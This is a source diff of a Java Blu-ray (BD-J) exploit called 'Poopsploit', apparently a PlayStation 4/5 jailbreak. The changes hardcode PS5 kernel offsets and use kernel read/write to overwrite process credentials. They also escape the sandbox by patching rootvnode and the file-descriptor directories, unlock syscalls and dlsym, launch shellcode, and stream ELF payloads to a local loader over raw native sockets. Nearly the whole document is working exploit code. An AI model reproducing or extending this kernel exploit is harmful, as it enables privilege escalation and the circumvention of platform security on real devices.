@@ -12,12 +12,10 @@ import org.bdj.Status;
 
 import java.util.*;
 import java.io.*;
-import java.net.InetSocketAddress;
-import java.net.Socket;
 
 public class Poops {
     
-    private static final String VERSION_STRING = "BD-J Poopsploit 1.4";
+    private static final String VERSION_STRING = "BD-J Poopsploit 1.5 v2";
     
     private static final int KERNEL_PID = 0;
     
@@ -96,6 +94,7 @@ public class Poops {
     private static long pipe;
     private static long kqueue;
     private static long socket;
+    private static long connect;
     private static long socketpair;
     private static long recvmsg;
     private static long getsockopt;
@@ -204,7 +203,6 @@ public class Poops {
         }
         FW_VERSION = majorStr + "." + minorStr;
         PS4_KernelOffset.FW_VERSION = FW_VERSION;
-        PS5_KernelOffset.FW_VERSION = FW_VERSION;
     }
 
     private static int compareVersions(String v1, String v2) {
@@ -231,6 +229,7 @@ public class Poops {
         pipe = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "pipe");
         kqueue = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "kqueue");
         socket = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "socket");
+        connect = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "connect");
         socketpair = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "socketpair");
         recvmsg = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "recvmsg");
         getsockopt = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, "getsockopt");
@@ -258,6 +257,7 @@ public class Poops {
                 || pipe == 0
                 || kqueue == 0
                 || socket == 0
+                || connect == 0
                 || socketpair == 0
                 || recvmsg == 0
                 || getsockopt == 0
@@ -311,20 +311,20 @@ public class Poops {
             
         } else if (PLATFORM.equals("PS5")) {
             
-            if (compareVersions(FW_VERSION, "6.00") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
+            if (compareVersions(FW_VERSION, "6.02") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
                 NativeInvoke.sendNotificationRequest("UNSUPPORTED FW_VERSION");
                 Status.println("UNSUPPORTED FW_VERSION");
                 return false;
             }
             
-            FILEDESCENT_SIZE = PS5_KernelOffset.FILEDESCENT_SIZE;
-            KQ_FDP_OFFSET = PS5_KernelOffset.KQ_FDP_OFFSET;
-            PIPE_SIGIO_OFFSET = PS5_KernelOffset.PIPE_SIGIO_OFFSET;
-            IN6P_OUTPUTOPTS_OFFSET = PS5_KernelOffset.IN6P_OUTPUTOPTS_OFFSET;
-            IP6PO_RHI_RTHDR_OFFSET = PS5_KernelOffset.IP6PO_RHI_RTHDR_OFFSET;
-            ROOTVNODE_OFFSET = PS5_KernelOffset.ROOTVNODE_OFFSET;
-            FDT_OFILES_OFFSET = PS5_KernelOffset.FDT_OFILES_OFFSET;
-            P_PID_OFFSET = PS5_KernelOffset.P_PID_OFFSET;
+            FILEDESCENT_SIZE = 0x30;
+            KQ_FDP_OFFSET = 0xA8;
+            PIPE_SIGIO_OFFSET = 0xd8;
+            IN6P_OUTPUTOPTS_OFFSET = 0x120;
+            IP6PO_RHI_RTHDR_OFFSET = 0x70;
+            ROOTVNODE_OFFSET = 0x8;
+            FDT_OFILES_OFFSET = 0x8;
+            P_PID_OFFSET = 0xbc;
             
         } else {
             Status.println("UNSUPPORTED PLATFORM : " + PLATFORM);
@@ -356,6 +356,10 @@ public class Poops {
     private static long write(int fd, Buffer buf, long nbytes) {
         return api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
     }
+
+    private static long write(int fd, long address, long nbytes) {
+        return api.call(write, fd, address, nbytes);
+    }
     
     private static long writev(int fd, Buffer iov, int iovcnt) {
         return api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
@@ -375,6 +379,10 @@ public class Poops {
     
     private static int socket(int domain, int type, int protocol) {
         return (int) api.call(socket, domain, type, protocol);
+    }
+
+    private static int connect(int fd, Buffer sockaddr, int socklen) {
+        return (int) api.call(connect, fd, sockaddr != null ? sockaddr.address() : 0, socklen);
     }
     
     private static int socketpair(int domain, int type, int protocol, Int32Array sv) {
@@ -442,7 +450,7 @@ public class Poops {
 
         //return ret;
     }
-    
+
     private static int cpusetSetAffinity(int core) {
         Buffer mask = new Buffer(CPU_SET_SIZE);
         mask.putShort(0x00, (short) (1 << core));
@@ -842,7 +850,7 @@ public class Poops {
         // Leak kqueue.
         int attempts = 0;
         int kq = 0;
-        while (attempts < 50000) {
+        while (attempts < 10000) {
             kq = kqueue();
 
             // Leak with other rthdr.
@@ -1257,10 +1265,6 @@ public class Poops {
     }
 
     private static boolean ps5_jailbreak() {
-
-        kdata_base = allproc - PS5_KernelOffset.getOffset("ALLPROC");
-        
-        Status.println("kdata_base: " + Long.toHexString(kdata_base));
         
         long p = curproc;
         long p_ucred = kapi.kread64(p + 0x40);
@@ -1276,24 +1280,30 @@ public class Poops {
         kapi.kwrite64(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[1]
         kapi.kwrite8(p_ucred + 0x83, (byte) 0x80); // cr_sceAttr[0]
         
-        // For some reason patching rootvnode makes BD-J crash when closing
-        // Restore it before closing
         // Allow root file system access.
-        
-/*         long rootvnode = getRootVnode();        
+        long rootvnode = getRootVnode();        
         long p_fd = kapi.kread64(p + 0x48);
         bdj_vnode = kapi.kread64(p_fd + 0x10);
         
-        Status.println("bdj_vnode: " + Long.toHexString(bdj_vnode)); */
+        kapi.kwrite64(p_fd + 0x08, rootvnode); // fd_cdir
+        kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
+        kapi.kwrite64(p_fd + 0x18, 0); // fd_jdir
+
+        // Allow syscall from everywhere.
+        long p_dynlib = kapi.kread64(p + 0x3e8);
+        kapi.kwrite64(p_dynlib + 0xf0, 0); // start
+        kapi.kwrite64(p_dynlib + 0xf8, 0xFFFFFFFFFFFFFFFFL); // end
         
-        // kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
+        // Allow dlsym.
+        long dynlib_eboot = kapi.kread64(p_dynlib + 0x00);
+        long eboot_segments = kapi.kread64(dynlib_eboot + 0x40);
+        kapi.kwrite64(eboot_segments + 0x08, 0); // addr
+        kapi.kwrite64(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFFL); // size 
         
-        if (!GPU.run(kdata_base, curproc)) {
-            Status.println("GPU rw failed");
-            return false;
-        }
+        AioShellcode.start(allproc);
         
         return true;
+        
     }
     
     private static void cleanup() {
@@ -1360,48 +1370,64 @@ public class Poops {
 
     public static boolean sendTcp(String payloadPath, int ldrPort) {
         InputStream elfInput = null;
-        Socket elfldrSocket = null;
-        OutputStream socketOutput = null;
+        int sockFd = -1;
 
         try {
-            elfInput = ElfLoader.class.getResourceAsStream(payloadPath);
+            elfInput = AioShellcode.class.getResourceAsStream(payloadPath);
             if (elfInput == null) {
                 Status.println("'" + payloadPath + "' not found in payload.jar.");
                 return false;
             }
 
-            Status.println("Sending '" + payloadPath + "' to 127.0.0.1:XXXX...", false);
-            elfldrSocket = new Socket();
-            elfldrSocket.connect(new InetSocketAddress("127.0.0.1", ldrPort), 500);
-            socketOutput = elfldrSocket.getOutputStream();
+            Status.println("Sending '" + payloadPath + "' to 127.0.0.1:" + ldrPort + "...", false);
+
+            sockFd = socket(AF_INET, SOCK_STREAM, 0);
+            if (sockFd == -1) {
+                Status.println("socket() failed");
+                return false;
+            }
+
+            Buffer sockaddrIn = new Buffer(16);
+            sockaddrIn.putByte(0x00, (byte) 16);
+            sockaddrIn.putByte(0x01, (byte) AF_INET);
+            sockaddrIn.putShort(0x02, htons(ldrPort));
+            sockaddrIn.putInt(0x04, aton("127.0.0.1"));
+
+            if (connect(sockFd, sockaddrIn, 16) == -1) {
+                Status.println("connect() failed");
+                return false;
+            }
             Status.println("Socket connected");
 
             byte[] buffer = new byte[4096];
+            Buffer nativeBuffer = new Buffer(buffer.length);
             int bytesRead = 0;
             int total = 0;
 
             while ((bytesRead = elfInput.read(buffer)) != -1) {
-                socketOutput.write(buffer, 0, bytesRead);
+                nativeBuffer.put(0, buffer);
+
+                int written = 0;
+                while (written < bytesRead) {
+                    long ret = write(sockFd, nativeBuffer.address() + written, bytesRead - written);
+                    if (ret <= 0) {
+                        Status.println("write() failed");
+                        return false;
+                    }
+                    written += (int) ret;
+                }
                 total += bytesRead;
             }
 
             Status.println("wrote total " + total);
-            socketOutput.flush();
-            Status.println("'" + payloadPath + "' sent to 127.0.0.1:XXXX.", false);
+            Status.println("'" + payloadPath + "' sent to 127.0.0.1:" + ldrPort + ".", false);
             return true;
         } catch (IOException e) {
             Status.printStackTrace("Failed to send '" + payloadPath + "'", e);
             return false;
         } finally {
-            if (socketOutput != null) {
-                try {
-                    socketOutput.close();
-                } catch (IOException e) {}
-            }
-            if (elfldrSocket != null) {
-                try {
-                    elfldrSocket.close();
-                } catch (IOException e) {}
+            if (sockFd != -1) {
+                close(sockFd);
             }
             if (elfInput != null) {
                 try {
@@ -1411,7 +1437,23 @@ public class Poops {
         }
     }
 
+    private static short htons(int port) {
+        return (short) (((port & 0x00FF) << 8) | ((port & 0xFF00) >>> 8));
+    }
+
+    private static int aton(String ip) {
+        int i0 = ip.indexOf('.');
+        int i1 = ip.indexOf('.', i0 + 1);
+        int i2 = ip.indexOf('.', i1 + 1);
+        int a = Integer.parseInt(ip.substring(0, i0));
+        int b = Integer.parseInt(ip.substring(i0 + 1, i1));
+        int c = Integer.parseInt(ip.substring(i1 + 1, i2));
+        int d = Integer.parseInt(ip.substring(i2 + 1));
+        return (d << 24) | (c << 16) | (b << 8) | a;
+    }
+
     private static void BinHenloader() {
+        Status.println("Wait for binloader to start...");
         BinLoader.start();
         try { Thread.sleep(4000); } catch(Exception e) {}
 
@@ -1420,7 +1462,7 @@ public class Poops {
     }
 
     private static void ElfAutoloader() {
-        ElfLoader.start(kdata_base, kq_fdp);
+        Status.println("Wait for elfldr to start...");
         try { Thread.sleep(4000); } catch(Exception e) {}
 
         Status.println("PS5 autoloader starting...");
@@ -1528,13 +1570,12 @@ public class Poops {
             }
             
             cleanup();
-            
+
             ElfAutoloader();
-            
+
             // This is temp fix
             // kill bdj.elf otherwise BD-J crashes when closing app
             kill_bdj();
-            
         } else {
             cleanup();
         }
